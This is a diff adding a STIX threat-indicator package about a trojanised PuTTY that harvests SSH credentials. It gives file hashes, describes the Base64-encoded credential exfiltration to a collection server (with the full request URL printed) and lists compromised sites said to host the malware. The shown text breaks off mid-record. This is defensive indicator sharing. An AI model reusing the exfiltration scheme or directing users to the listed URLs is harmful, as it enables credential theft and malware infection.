@@ -1,0 +1,596 @@
+<stix:STIX_Package xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AddressObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-15-10164" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd   http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd   http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd   http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd   http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd   http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd   http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd   http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd   http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd   http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd   http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd   http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd   http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd   http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd   http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd   http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd   http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd   http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd      http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd   http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Malicious Version of PuTTY Served From a Redirected PuTTY Websites</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators - Malware Artifacts</stix:Package_Intent>
+    <stix:Description>On 13 May 2015, an IT networking sector organization observed a malicious version of PuTTY served from a redirected PuTTY website. The MalPutty file PUTTY.exe (MD5: b5c88d5af37afd13f89957150f9311ca) was also served from many compromised websites. The MalPutty sent stolen credentials to ngusto-uro.ru. 
+
+Credentials are harvested from the users when they initiate an SSH session and are sent back with the string "ssh://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP ADDRESS or DOMAIN&gt;:&lt;PORT&gt;" which is then Base64 encoded and appended to the URI before an HTTP GET request is sent to collection server "http://ngusto-uro.ru/get/index.php?record=c3NoOi8vVVNFUk5BTUU6UGFzc3dvcmQxMjM0QDE5Mi4xNjguMC4w - 456 220 0 "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168
+Version/11.51".
+
+This activity is similar to the same format used in the StealZilla campaign, except with SSH in place of FTP for the protocol. The user agent string is hardcoded as "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168 Version/11.51". Traffic Direction Systems (TDS) were in place to serve as a means to the server-side redirection.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2015-06-11T16:13:39Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-8748652e-3a1f-41eb-87d1-7bd44890f698" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-497c7755-9641-410f-889d-98df82249dba"/>
+        <indicator:Indicator idref="CISCP:indicator-8d37d84f-9da0-46d6-bde5-cbfe099e1157"/>
+        <indicator:Indicator idref="CISCP:indicator-d3a4cd51-43bc-43b5-b01c-4a914205ed1d"/>
+        <indicator:Indicator idref="CISCP:indicator-82a187d0-ae16-4e2c-b774-0b71e477f8ea"/>
+        <indicator:Indicator idref="CISCP:indicator-f8c22db7-9fb1-4270-ab46-6cd2cd938b6a"/>
+        <indicator:Indicator idref="CISCP:indicator-ece00360-2f61-41c8-9ce0-12e80c46018c"/>
+        <indicator:Indicator idref="CISCP:indicator-5c20d8a2-7255-48ee-8bae-584b2eda82a1"/>
+        <indicator:Indicator idref="CISCP:indicator-7e53b3cc-0c95-46c9-909b-4bc98a177dc3"/>
+        <indicator:Indicator idref="CISCP:indicator-5e32b2b1-6074-4fb9-94f6-f21ec7130f7b"/>
+        <indicator:Indicator idref="CISCP:indicator-7f0b30f5-579e-42c0-a360-fb56953b40cd"/>
+        <indicator:Indicator idref="CISCP:indicator-0440356d-d247-49cb-a182-a56f3bb6112b"/>
+        <indicator:Indicator idref="CISCP:indicator-4ce04649-d4d5-4505-9558-821925805499"/>
+        <indicator:Indicator idref="CISCP:indicator-b1b098a8-b51b-464b-ab0b-de5b6fea0b63"/>
+        <indicator:Indicator idref="CISCP:indicator-fe74cf48-2f25-49fb-b1a7-0851efa7d133"/>
+        <indicator:Indicator idref="CISCP:indicator-2dd1e07b-9667-476b-9253-c817e3c58e2f"/>
+        <indicator:Indicator idref="CISCP:indicator-1d8b125e-3b41-4473-8820-413261775725"/>
+        <indicator:Indicator idref="CISCP:indicator-68de2914-bc17-49e7-9f60-57eb672d0825"/>
+        <indicator:Indicator idref="CISCP:indicator-c90807a3-089f-454d-8931-0855c694eba5"/>
+        <indicator:Indicator idref="CISCP:indicator-aa123448-8f06-4e20-87c6-857c7eb83b91"/>
+        <indicator:Indicator idref="CISCP:indicator-4e52e0e3-16cd-4276-b618-946e5f96480c"/>
+        <indicator:Indicator idref="CISCP:indicator-5c100221-e02e-4a39-bb75-95a78479fd64"/>
+        <indicator:Indicator idref="CISCP:indicator-ae9395fb-8fcf-4a52-9de2-e51a6fd59843"/>
+        <indicator:Indicator idref="CISCP:indicator-c6a59467-d03b-483c-b795-404096037213"/>
+        <indicator:Indicator idref="CISCP:indicator-70765433-ab27-4105-a0cd-a91602f85a1e"/>
+        <indicator:Indicator idref="CISCP:indicator-e2851927-5033-4a42-b35c-3a471182b2eb"/>
+        <indicator:Indicator idref="CISCP:indicator-eb1d2201-1eb6-4655-b7b8-91d1847b0321"/>
+        <indicator:Indicator idref="CISCP:indicator-c206db15-b644-4735-bd6f-74b3312f0395"/>
+        <indicator:Indicator idref="CISCP:indicator-1e38f08e-e42d-41b4-b2b7-7514a9c59a06"/>
+        <indicator:Indicator idref="CISCP:indicator-01797c9a-b331-4dda-b99d-ba38bb18736d"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-497c7755-9641-410f-889d-98df82249dba" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The malicious PUTTY.exe (MD5 b5c88d5af37afd13f89957150f9311ca) comes in the PE format, just like the original. This malicious version of PuTTY maintains a similar user interface and functionality as the original, although it was compiled by a different version of Microsoft Visual C++. This resulted in a slightly altered user interface. The "About" section was listed as "Unidentified build, Nov 29 2013 21:41:02". The legitimate version of PuTTy v0.63 was released a few months prior to this compile time. This would require a different version number. 
+
+Credentials are harvested from the users when they initiate an SSH session, then sent back with the string "ssh://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP ADDRESS or DOMAIN&gt;:&lt;PORT&gt;". This string was then encoded with Base64 and appended to the URI. An HTTP GET request based on this string is sent to the collection server "http://ngusto-uro.ru/get/index.php?record=c3NoOi8vVVNFUk5BTUU6UGFzc3dvcmQxMjM0QDE5Mi4xNjguMC4w - 456 220 0 "Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168
+Version/11.51".
+
+This activity is similar to the same format used in the StealZilla campaign, except with SSH in place of FTP for the protocol. The user agent string is hardcoded as
+"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.9.168 Version/11.51".</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5dcce761-9e94-4a37-b827-d64933f76bfa">
+        <cybox:Object id="CISCP:Object-4d867682-7004-4878-801f-df7041110115">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">PUTTY.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">593920</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">b5c88d5af37afd13f89957150f9311ca</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">51c409b7f0c641ce3670b169b9a7515ac38cdb82</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">d3e866e5bf18f2d9c667563de9150b705813e03377312b6974923f6af2e56291</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">12288:D+2u1NeYng+VkZfUn6f0xXPNQ/UcENgfLh3xKcjgoZ1NGw6iY:cNeYng+uZcn6f0xXPNQ/Uto3xXgsN16</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-8d37d84f-9da0-46d6-bde5-cbfe099e1157" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-1b77007d-9420-422a-b016-9322d84fcb5b">
+        <cybox:Object id="CISCP:Object-cefd8def-7027-40ff-9f40-9c26f7136dc4">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://stc-castelnaudary.fr/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-d3a4cd51-43bc-43b5-b01c-4a914205ed1d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5e11334c-7f5a-4d62-8b69-86b109d56286">
+        <cybox:Object id="CISCP:Object-5d727f0f-e13a-428e-af7c-0eddd9361a29">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://holidaystennisclub.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-82a187d0-ae16-4e2c-b774-0b71e477f8ea" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-8174e911-222a-4343-8628-3a435f571a34">
+        <cybox:Object id="CISCP:Object-959e0bfd-b61b-4bb3-9bd4-b3adc9b5303f">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://stonarov.wz.cz/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-f8c22db7-9fb1-4270-ab46-6cd2cd938b6a" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-deec8d93-e0cf-46ed-a2a8-93082f77172a">
+        <cybox:Object id="CISCP:Object-0ad77772-6e49-49fd-a504-cbda1c29573e">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://stabryl.home.pl/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ece00360-2f61-41c8-9ce0-12e80c46018c" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-84f7e5b3-8a74-44d2-b69c-0fec56e1d83a">
+        <cybox:Object id="CISCP:Object-9efaf26c-b9c5-4aaa-80d6-e995e34e813b">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://mohsenfeshari.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-5c20d8a2-7255-48ee-8bae-584b2eda82a1" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-7bc8bb3d-8b19-4fba-ba50-206b00b4d5ff">
+        <cybox:Object id="CISCP:Object-566de7e0-d0af-42c2-bb15-c603ae68ec1a">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://nwedigital.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7e53b3cc-0c95-46c9-909b-4bc98a177dc3" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-f355a59d-3660-43db-a5e4-1bb85590355d">
+        <cybox:Object id="CISCP:Object-8215ee86-ddc3-45c9-a3b0-86bce3029001">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://kangasquads.com.au/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-5e32b2b1-6074-4fb9-94f6-f21ec7130f7b" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5991ec98-aa9e-462f-a4e2-8e8daa6ecfd5">
+        <cybox:Object id="CISCP:Object-ead61e6c-b829-464c-a756-8f16f34c3c1e">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://sistemaysoporte.es/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7f0b30f5-579e-42c0-a360-fb56953b40cd" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-787f46dd-2ca4-49e8-a81f-a4d291277504">
+        <cybox:Object id="CISCP:Object-15ec2801-b1f9-426d-8043-207798c1fb62">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://straydogwinter.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-0440356d-d247-49cb-a182-a56f3bb6112b" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-883d8581-1a63-4a4d-864c-6766cd040a15">
+        <cybox:Object id="CISCP:Object-fe35df1a-34de-4f71-b3cd-9ac1a227a0ac">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://snailmailrecall.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-4ce04649-d4d5-4505-9558-821925805499" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-d40061a8-2ce0-440d-a145-faf4138f2f71">
+        <cybox:Object id="CISCP:Object-630d9c8c-5c15-4467-ba7b-5bb42079300d">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://steveacker.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-b1b098a8-b51b-464b-ab0b-de5b6fea0b63" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5114bb97-8f06-4282-9911-af33793b6283">
+        <cybox:Object id="CISCP:Object-cc33b142-5e07-4db0-9832-69d7fd914620">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://starsretail.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-fe74cf48-2f25-49fb-b1a7-0851efa7d133" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-6b040546-859d-47e3-973c-a8457f1edb82">
+        <cybox:Object id="CISCP:Object-5eb9d9c4-91a3-4f86-9609-ae50372d4439">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://podspeak.net/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-2dd1e07b-9667-476b-9253-c817e3c58e2f" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-84fc850c-873c-4fb8-80de-268bef8ea06b">
+        <cybox:Object id="CISCP:Object-fc8d4e66-ac94-4d68-af51-e6ef8160d1ec">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
